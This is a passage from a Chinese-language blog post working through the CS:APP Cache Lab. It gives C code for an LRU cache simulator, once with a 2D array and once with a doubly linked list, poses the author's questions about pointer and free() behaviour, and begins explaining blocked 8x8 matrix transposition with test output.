cache[i] = (CacheSet)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">    assert(cache[i]);</span><br><span class="line">    <span class="built_in">memset</span>(cache[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(*cache[i]));</span><br><span class="line">    <span class="comment">// memset(cache[i], 0, E * sizeof(CacheLine));</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeCache</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">    <span class="built_in">free</span>(cache[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(cache);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Simulate</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 其中 I 和 S 只需访问缓存一次，而 M</span></span><br><span class="line">  <span class="comment">// 需要两次，且每进行一次操作，就得更新一次时间戳：</span></span><br><span class="line">  FILE *f = fopen(file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  assert(f);</span><br><span class="line">  <span class="type">char</span> op;</span><br><span class="line">  <span class="type">uint64_t</span> addr;  <span class="comment">// uint64_t定义在stdint.h中</span></span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%c %lx,%d&quot;</span>, &amp;op, &amp;addr, &amp;size) &gt; <span class="number">0</span>) &#123;  <span class="comment">// size 并未使用</span></span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">        AccessCache(addr);  <span class="comment">// 还会往下执行喔</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">        AccessCache(addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LRUUpdate();</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LRUUpdate</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; ++j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (cache[i][j].valid) &#123;</span><br><span class="line">        ++cache[i][j].time;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AccessCache</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">  <span class="type">int</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line">  <span class="type">uint64_t</span> mask = ((<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>) - <span class="number">1</span>) &gt;&gt;</span><br><span class="line">                  (<span class="number">63</span> - s);  <span class="comment">// 低s位1为set需要，高(63+1)-s位0把tag遮掉</span></span><br><span class="line">  CacheSet cache_set = cache[(addr &gt;&gt; b) &amp; mask];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 有命中</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cache_set[i].valid &amp;&amp; cache_set[i].tag == tag) &#123;</span><br><span class="line">      ++hit;</span><br><span class="line">      cache_set[i].time = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ++miss;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 有空位，直接写入</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!cache_set[i].valid) &#123;</span><br><span class="line">      cache_set[i].valid = <span class="number">1</span>;</span><br><span class="line">      cache_set[i].tag = tag;</span><br><span class="line">      cache_set[i].time = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 没有空位，只能使用LRU算法进行替换</span></span><br><span class="line">  ++evict;</span><br><span class="line">  <span class="type">int</span> evict_idx = <span class="number">0</span>, max_time = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cache_set[i].time &gt; max_time) &#123;</span><br><span class="line">      max_time = cache_set[i].time;</span><br><span class="line">      evict_idx = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cache_set[evict_idx].tag = tag;</span><br><span class="line">  cache_set[evict_idx].time = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">int</span> opt;</span><br><span class="line">  <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;s:E:b:t:&quot;</span>)) !=</span><br><span class="line">         <span class="number">-1</span>) &#123;  <span class="comment">// &#x27;t&#x27;后面也要加&#x27;:&#x27;，否则会报segmentation fault</span></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        s = atoi(optarg);</span><br><span class="line">        S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        E = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        b = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">        <span class="built_in">strcpy</span>(file_path, optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  MallocCache();</span><br><span class="line">  Simulate();</span><br><span class="line">  FreeCache();</span><br><span class="line"></span><br><span class="line">  printSummary(hit, miss, evict);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="法2：双向链表">法2：双向链表</h2><p>感觉二维数组其实比双向链表更贴合缓存的硬件实现，但是散列表+双向链表更适合软件实现缓存更新算法，下面的实现中并未使用散列表。二维数组模拟表示中需要使用valid字段，但是双向链表中不需要：链表中所有元素都是合法的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="comment">// unsigned valid;  // 使用链表模拟CacheLine就不需要valid了</span></span><br><span class="line">  <span class="type">uint64_t</span> tag;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Node</span> *<span class="title">prev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Node *head;</span><br><span class="line">  Node *tail;</span><br><span class="line">  <span class="type">int</span> *size;  <span class="comment">// 好像不用int*, 用int确实不太行</span></span><br><span class="line">&#125; LRUCacheSet;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitializeLRU</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Simulate</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Update</span><span class="params">(<span class="type">uint64_t</span> addr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteElement</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddToHead</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MoveToHead</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> LRUCacheSet *cache;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_PATH_LENGTH 100</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s, S, E, b;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> file_path[MAX_FILE_PATH_LENGTH];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hit, miss, evict;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitializeLRU</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">  cache[i].head = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">  cache[i].tail = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">  cache[i].head-&gt;next = cache[i].tail;</span><br><span class="line">  cache[i].tail-&gt;prev = cache[i].head;</span><br><span class="line">  cache[i].size = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  *(cache[i].size) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Simulate</span><span class="params">()</span> &#123;</span><br><span class="line">  cache = <span class="built_in">malloc</span>(S * <span class="keyword">sizeof</span>(LRUCacheSet));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">    InitializeLRU(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 其中 I 和 S 只需访问缓存一次，而 M</span></span><br><span class="line">  <span class="comment">// 需要两次，且每进行一次操作，就得更新一次时间戳：</span></span><br><span class="line">  FILE *f = fopen(file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  assert(f);</span><br><span class="line">  <span class="type">char</span> op;</span><br><span class="line">  <span class="type">uint64_t</span> addr;  <span class="comment">// uint64_t定义在stdint.h中？</span></span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%c %lx,%d&quot;</span>, &amp;op, &amp;addr, &amp;size) &gt; <span class="number">0</span>) &#123;  <span class="comment">// size 并未使用</span></span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">        Update(addr);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">        Update(addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Update</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">  <span class="type">uint64_t</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line">  <span class="type">uint64_t</span> mask = ((<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>) - <span class="number">1</span>) &gt;&gt; (<span class="number">63</span> - s);</span><br><span class="line">  LRUCacheSet target_cache_set = cache[(addr &gt;&gt; b) &amp; mask];</span><br><span class="line">  Node *cur = target_cache_set.head-&gt;next;</span><br><span class="line">  <span class="comment">// 以下使用顺序查找的方式，而非上述算法题中hash映射法,</span></span><br><span class="line">  <span class="comment">// 也非硬件采取的快速查抄（猜硬件不会遍历）</span></span><br><span class="line">  <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (cur != target_cache_set.tail) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur-&gt;tag == tag) &#123;</span><br><span class="line">      found = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cur = cur-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">    ++miss;</span><br><span class="line">    Node *new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;tag = tag;</span><br><span class="line">    <span class="keyword">if</span> (*(target_cache_set.size) == E) &#123;</span><br><span class="line">      DeleteElement(&amp;target_cache_set, target_cache_set.tail-&gt;prev);</span><br><span class="line">      <span class="comment">// free(target_cache_set.tail-&gt;prev);</span></span><br><span class="line">      ++evict;</span><br><span class="line">    &#125;</span><br><span class="line">    AddToHead(&amp;target_cache_set, new_node);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ++hit;</span><br><span class="line">    MoveToHead(&amp;target_cache_set, cur);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteElement</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span> &#123;</span><br><span class="line">  node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">  node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">  --*(cur_set-&gt;size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AddToHead</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span> &#123;</span><br><span class="line">  node-&gt;prev = cur_set-&gt;head;</span><br><span class="line">  node-&gt;next = cur_set-&gt;head-&gt;next;</span><br><span class="line">  cur_set-&gt;head-&gt;next-&gt;prev = node;</span><br><span class="line">  cur_set-&gt;head-&gt;next = node;</span><br><span class="line">  ++*(cur_set-&gt;size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MoveToHead</span><span class="params">(LRUCacheSet *cur_set, Node *node)</span> &#123;</span><br><span class="line">  DeleteElement(cur_set, node);</span><br><span class="line">  AddToHead(cur_set, node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">int</span> opt;</span><br><span class="line">  <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;s:E:b:t:&quot;</span>)) !=</span><br><span class="line">         <span class="number">-1</span>) &#123;  <span class="comment">// &#x27;t&#x27;后面也要加&#x27;:&#x27;，否则会报segmentation fault</span></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        s = atoi(optarg);</span><br><span class="line">        S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">// 需要break吗?</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        E = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        b = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">        <span class="built_in">strcpy</span>(file_path, optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Simulate();</span><br><span class="line">  printSummary(hit, miss, evict);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>[problems]对于以上代码，个人有两点困惑：</p><ol><li>为什么第21行中<code>int *size</code> 必须使用<code>int*</code>而不能是<code>int</code>？<br><a href="https://www.bilibili.com/video/BV1PF411Y7NM/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f">郭郭wg 2:38</a> 说是为了永久化修改，否则后期可能会发现值并未修改。<br>可我还是没有搞懂。</li><li>为什么89行中的<code>free(target_cache_set.tail-&gt;prev)</code>不能加上？<br>删除后会导致<code>Error running test simulator: Status 139</code>, 实在是没理解为啥会这样。个人猜测是对<code>free()</code>的理解还不到位。</li></ol><p>如果大佬能解答我的困惑，若能在评论区不吝赐教，本人将不胜感激！</p></blockquote><h1 id="Part-B-Optimizing-Matrix-Transpose">Part B: Optimizing Matrix Transpose</h1><p>题目要求在<code>trans.c</code>中编写矩阵转置的函数，在一个 s = 5, E = 1, b = 5 的缓存中进行读写，针对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><mo>×</mo><mn>32</mn></mrow><annotation encoding="application/x-tex">32×32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">32</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>64</mn><mo>×</mo><mn>64</mn></mrow><annotation encoding="application/x-tex">64×64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">64</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">64</span></span></span></span>和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>61</mn><mo>×</mo><mn>67</mn></mrow><annotation encoding="application/x-tex">61×67</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">61</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">67</span></span></span></span> 这三种维度的矩阵进行优化，最多使用12个局部变量。同时给出了以下两点友情提示：</p><ul><li>使用分块技术进行优化</li><li>对角线上的元素会引发冲突未击中</li></ul><h2 id="原始转置代码中的问题——为什么要分块">原始转置代码中的问题——为什么要分块</h2><p>s = 5, E = 1, b = 5 的缓存有32组，每组一行，每行存 8 个<code>int</code>。Part B 给出了最原始的转置操作代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于C语言中矩阵是行优先存储的，因此对于A矩阵来说，代码是缓存友好的：在从内存读 <code>A[0][0]</code> 的时候，除了 <code>A[0][0]</code> 被加载到缓存中，它之后的 <code>A[0][1]---A[0][7]</code> 也会被加载进缓存。但对于B矩阵而言，写入B矩阵是一列一列写入的：</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20231003210611745.png" alt></p><p>在写入<code>B</code>的前 8 行后，<code>B</code>的<code>D</code>区域就全部进入了缓存，此时如果能对<code>D</code>进行操作，那么就能利用上缓存的内容，不会<code>miss</code>；但是，暴力解法接下来操作的是<code>C</code>，每一个元素的写都要驱逐之前的缓存区，当来到第 2 列继续写<code>D</code>时，它对应的缓存行很可能已经被驱逐了，于是又要<code>miss</code>，也就是说，暴力解法的问题在于没有充分利用上已经进入缓存的元素。</p><p>缓存只够存储一个矩阵的四分之一（宽度为1/4，面积为1/16），<code>A</code>中的元素对应的缓存行每隔8行就会重复。<code>A</code>和<code>B</code>的地址由于取余关系（可见源码中矩阵定义或实验材料中暗示），每个元素对应的地址是相同的。各个元素对应缓存行如下左图：</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20231003210854911.png" alt="image-20231003210854911"></p><h2 id="32×32">32×32</h2><p>分块解决的是在矩阵转置过程中，两个矩阵的内存的访问顺序不同导致的缓存不友好的问题，其缓解了同一个矩阵内部缓存块相互替换的问题。</p><p>分块的单位一般是一个经验值，比如我们从这道题入手分析，发现A矩阵从第9行开始出现了缓存冲突，因此可以使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mo>×</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">8\times 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span> 的分块技术（因为在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mo>×</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">8\times 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span> 的分块内，不存在矩阵内部的缓存冲突）。</p><p>如上一张图右图所示，结合左图中块标号来看，<code>A</code>中标红的块占用的是缓存的第 0，4，8，12，16，20，24，28组，而<code>B</code>中标红的块占用的是缓存的第2，6，10，14，18，16，30组，刚好不会冲突（虽然这样浪费了奇数序号的缓存行）。事实上，<strong>除了对角线</strong>，<code>A</code>与<code>B</code>中对应的块都不会冲突。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i1 = i; i1 &lt; i + <span class="number">8</span>; ++i1)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j1 = j; j1 &lt; j + <span class="number">8</span>; ++j1)</span><br><span class="line">                B[j1][i1] = A[i1][j1];</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  l4_cachelab ./test-trans -M 32 -N 32    </span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1709, misses:344, evictions:312</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 